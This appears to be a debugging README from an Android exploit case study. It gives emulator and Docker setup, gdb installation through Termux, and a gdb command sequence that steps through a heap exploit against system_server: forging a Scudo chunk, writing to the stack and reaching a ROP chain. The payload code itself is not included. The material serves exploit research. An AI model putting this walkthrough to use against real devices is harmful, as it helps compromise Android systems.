# Debugging

If you'd like to debug the exploit and figure out what is going on there's a couple extra steps to do.

## Setup Docker

backup the `make_emulator_vulnerable.sh` and copy `debugging/make_emulator_vulnerable.sh` to the case-study folder.
```
cp make_emulator_vulnerable.sh make_vuln_back.sh
cp debugging/make_emulator_vulnerable.sh .
```

rebuild the docker, when the docker is started everything is set up but the exploit is not attempted. Instead the script simply spawns a shell in the docker container.

### scudocookie

copy the scudocookie folder to the docker container `/debugging/` folder. In the case-study folder run:
```
docker cp ../scudocookie emu:/debugging/
```

### Install gdb

First download the termux [termux_app..x86_64.apk](https://github.com/termux/termux-app/releases/tag/v0.118.0)

Copy the apk to the docker container and install it on the phone using `adb install termux.apk`

Run the `setup_debugging_phone.sh` script in the `debugging` folder to upload all the necessary debugging files to the phone.

Then run the following (may take multiple attempts) to install gdb
```
adb push /debugging/termux_install.sh /data/local/tmp
adb shell
/data/local/tmp/termux_install.sh
```



## System Server debugging

attach to system_server:
```
PATH=$PATH:/data/data/com.termux/files/usr/bin
gdb -p $(pgrep system_server) -x init.gdb
```

The init.gdb sets up the necessary breakpoints and scripts to help walk through the exploit and make it succeed (mostly).

gdb commands:
```
c #skip first native_handle_create
c #skip first onTransact
c #skip second onTransact
wow1 # forge chunk and continue
c # attack app will now send second payload to write to the stack
c # skip first onTransact
c # skip second onTranscat
ni # step over secondary chunk malloc
xinfo $rax # check that secondary chunk is onn the stack (if not do: call (void*)malloc(0x1fd00) until you get chunk on stack, then set $rax to that)
bmcp # setp up to android::Parcel::read() memcpy call
c # go to breakpoint
wow2 # all stalling to go the ropchain
```
